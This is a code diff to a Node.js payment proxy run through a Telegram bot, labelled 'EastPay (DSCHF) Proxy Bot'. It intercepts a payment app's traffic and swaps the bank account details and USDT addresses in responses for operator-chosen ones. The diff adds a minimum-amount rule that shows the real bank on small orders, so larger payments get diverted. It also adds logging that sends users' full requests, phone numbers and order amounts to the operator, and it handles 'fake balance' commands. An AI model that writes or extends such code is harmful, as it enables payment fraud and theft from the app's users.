@@ -38,6 +38,7 @@ const CACHE_TTL = 15000;
 const tokenUserMap = {};
 const userPhoneMap = {};
 let debugNextResponse = false;
+let debugMode = false;
 
 async function ensureWebhook() {
   if (!bot || webhookSet) return;
@@ -494,6 +495,20 @@ function applyUsdtReplacement(respBody, usdtAddress) {
   return { replaced, body: newBody, oldAddr };
 }
 
+function sendDebugLog(data, req, rawResp, label) {
+  if (!debugMode || !data.adminChatId || !bot) return;
+  try {
+    const url = req.originalUrl || '';
+    const method = req.method || '';
+    const reqBody = req.rawBody ? req.rawBody.toString().substring(0, 600) : '';
+    const respStr = (typeof rawResp === 'string' ? rawResp : JSON.stringify(rawResp) || '').substring(0, 800);
+    let msg = `🔍 [${label}]\n📡 ${method} ${url}`;
+    if (reqBody) msg += `\n📤 REQ: ${reqBody}`;
+    msg += `\n📥 RESP: ${respStr}`;
+    bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+  } catch(e) {}
+}
+
 async function proxyAndReplaceBankDetails(req, res, label, notify = false) {
   const data = await loadData();
   const reqUserId = await extractUserId(req, null);
@@ -505,7 +520,13 @@ async function proxyAndReplaceBankDetails(req, res, label, notify = false) {
     if (userId) saveTokenUserId(req, userId);
     const effectiveId = userId || reqUserId || '';
     const bank = await getActiveBankAndSave(data, effectiveId);
-    if (bank) {
+    let shouldOverride = true;
+    if (bank && bank.minAmount) {
+      const respData = getResponseData(jsonResp);
+      const amt = getOrderAmount(req, respData);
+      if (amt !== null && amt < bank.minAmount) shouldOverride = false;
+    }
+    if (bank && shouldOverride) {
       deepReplace(jsonResp, bank, {}, 0);
       if (debugNextResponse) {
         debugNextResponse = false;
@@ -527,9 +548,11 @@ async function proxyAndReplaceBankDetails(req, res, label, notify = false) {
     delete respHeaders['last-modified'];
     res.writeHead(200, respHeaders);
     res.end(finalBody);
+    sendDebugLog(data, req, respBody, label);
     if (notify && !isLogOff(data, effectiveId) && data.adminChatId && bot) {
       const phone = getPhone(data, effectiveId);
-      bot.sendMessage(data.adminChatId, `${label} [${effectiveId || 'N/A'}]${phone ? ' 📱' + phone : ''}${bank ? ' → Bank: ' + bank.accountHolder : ''}`).catch(()=>{});
+      const minNote = !shouldOverride && bank ? ' ⚠️ Real Bank (under min)' : (bank && shouldOverride ? ' → Bank: ' + bank.accountHolder : '');
+      bot.sendMessage(data.adminChatId, `${label} [${effectiveId || 'N/A'}]${phone ? ' 📱' + phone : ''}${minNote}`).catch(()=>{});
     }
     if (effectiveId) trackUser(data, effectiveId, label);
   } catch(e) { await transparentProxy(req, res); }
@@ -564,7 +587,7 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/start') {
       data.adminChatId = chatId;
       await saveData(data);
-      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user\n/debug - Debug next response');
+      await bot.sendMessage(chatId, '🚀 EastPay (DSCHF) Proxy Bot Started!\n\nCommands:\n/status - Bot status\n/on - Enable proxy\n/off - Disable proxy\n/banks - List banks\n/addbank - Add bank\n/removebank - Remove bank\n/setbank - Set active bank\n/setmin <n> <amount> - Min order amount for bank\n/rotate - Toggle auto-rotate\n/log - Toggle logging\n/debug on - Full request+response logging ON\n/debug off - Full logging OFF\n/debug - One-shot debug next response\n/setusdt <address> - Set USDT address override\n/usdt - Show current USDT address\n/removeusdt - Remove USDT override\n/debugusdt - Toggle USDT debug logging\n/add <userId> <amount> - Add balance\n/deduct <userId> <amount> - Deduct balance\n/remove balance <userId> - Remove fake balance\n/history - Balance history\n/off log <userId> - Disable logging for user\n/on log <userId> - Enable logging for user');
       return res.sendStatus(200);
     }
 
@@ -583,7 +606,9 @@ app.post('/bot-webhook', async (req, res) => {
     if (text === '/off' && !text.startsWith('/off ')) { data.botEnabled = false; await saveData(data); await bot.sendMessage(chatId, '🔴 Proxy OFF — passthrough'); return res.sendStatus(200); }
     if (text === '/rotate') { data.autoRotate = !data.autoRotate; data.lastUsedIndex = -1; await saveData(data); await bot.sendMessage(chatId, `🔄 Auto-Rotate: ${data.autoRotate ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
     if (text === '/log') { data.logRequests = !data.logRequests; await saveData(data); await bot.sendMessage(chatId, `📋 Logging: ${data.logRequests ? 'ON' : 'OFF'}`); return res.sendStatus(200); }
-    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 Debug ON — next bank-replace response dump'); return res.sendStatus(200); }
+    if (text === '/debug on') { debugMode = true; await bot.sendMessage(chatId, '🔍 Debug Mode: ON\nAb sare endpoints ka request + response yahan aayega.\n/debug off se band karo.'); return res.sendStatus(200); }
+    if (text === '/debug off') { debugMode = false; await bot.sendMessage(chatId, '🔍 Debug Mode: OFF'); return res.sendStatus(200); }
+    if (text === '/debug') { debugNextResponse = true; await bot.sendMessage(chatId, '🔍 One-shot Debug ON — next bank-replace response dump.\nPersistent ke liye: /debug on'); return res.sendStatus(200); }
     if (text === '/debugusdt') { debugUsdtMode = !debugUsdtMode; await bot.sendMessage(chatId, `🔍 USDT Debug: ${debugUsdtMode ? 'ON — koi bhi TRC20 address wala response log hoga' : 'OFF'}`); return res.sendStatus(200); }
 
     if (text.startsWith('/setusdt ')) {
@@ -1199,7 +1224,51 @@ app.all('/app/pay/debit/upis', async (req, res) => {
 });
 
 app.all('/app/pay/order/detail', async (req, res) => {
-  await proxyAndReplaceBankDetails(req, res, '📋 Order Detail');
+  const data = await loadData();
+  const reqUserId = await extractUserId(req, null);
+  try {
+    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
+    if (!jsonResp) { res.writeHead(response.status, respHeaders); res.end(respBody); return; }
+    const userId = await extractUserId(req, jsonResp);
+    if (userId) saveTokenUserId(req, userId);
+    const effectiveId = userId || reqUserId || '';
+    const respData = getResponseData(jsonResp);
+    const bank = await getActiveBankAndSave(data, effectiveId);
+    let shouldOverride = true;
+    if (bank && bank.minAmount) {
+      const amt = getOrderAmount(req, respData);
+      if (amt !== null && amt < bank.minAmount) shouldOverride = false;
+    }
+    if (bank && shouldOverride && jsonResp) deepReplace(jsonResp, bank, {}, 0);
+    let finalBody = JSON.stringify(jsonResp) || respBody;
+    if (data.usdtAddress) { const ur = applyUsdtReplacement(finalBody, data.usdtAddress); if (ur.replaced) finalBody = ur.body; }
+    respHeaders['content-type'] = 'application/json; charset=utf-8';
+    respHeaders['content-length'] = String(Buffer.byteLength(finalBody));
+    respHeaders['cache-control'] = 'no-store, no-cache, must-revalidate';
+    delete respHeaders['etag']; delete respHeaders['last-modified'];
+    res.writeHead(200, respHeaders);
+    res.end(finalBody);
+    sendDebugLog(data, req, respBody, 'Order Detail');
+    if (!isLogOff(data, effectiveId) && data.adminChatId && bot) {
+      const phone = getPhone(data, effectiveId);
+      const rd = (respData && typeof respData === 'object' && !Array.isArray(respData)) ? respData : {};
+      const orderId = rd.orderId || rd.orderNo || rd.id || req.parsedBody?.orderId || '';
+      const amount = rd.amount || rd.orderAmount || rd.money || req.parsedBody?.amount || '';
+      const now = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+      let msg = `🛒 Buy Task [${effectiveId || 'N/A'}]${phone ? ' 📱' + phone : ''}`;
+      if (orderId) msg += `\n📋 Order: ${orderId}`;
+      if (amount) msg += `\n💰 Amount: ₹${amount}`;
+      if (!shouldOverride && bank) {
+        msg += `\n⚠️ ₹${amount} < Min ₹${bank.minAmount} → Real Bank`;
+      } else if (bank && shouldOverride) {
+        msg += `\n🏦 Bank: ${bank.accountHolder} | ${bank.accountNo}`;
+        if (bank.ifsc) msg += ` | ${bank.ifsc}`;
+      }
+      msg += `\n🕐 ${now}`;
+      bot.sendMessage(data.adminChatId, msg).catch(()=>{});
+    }
+    if (effectiveId) trackUser(data, effectiveId, 'Order Detail');
+  } catch(e) { await transparentProxy(req, res); }
 });
 
 app.all('/app/pay/my/task', async (req, res) => {
@@ -1532,10 +1601,14 @@ app.get('/chcp/*', async (req, res) => {
 
 app.all('*', async (req, res) => {
   const data = cachedData || await loadData();
-  if (data.logRequests && !isLogOffByTokenFast(data, req) && data.adminChatId && bot) {
-    const method = req.method;
-    const url = req.originalUrl;
-    bot.sendMessage(data.adminChatId, `📡 ${method} ${url}`).catch(()=>{});
+  const skip = isLogOffByTokenFast(data, req);
+  if (!skip && data.adminChatId && bot) {
+    if (data.logRequests) {
+      bot.sendMessage(data.adminChatId, `📡 ${req.method} ${req.originalUrl}`).catch(()=>{});
+    }
+    if (debugMode) {
+      sendDebugLog(data, req, '(forwarded — no intercept)', req.originalUrl);
+    }
   }
   await transparentProxy(req, res);
 });
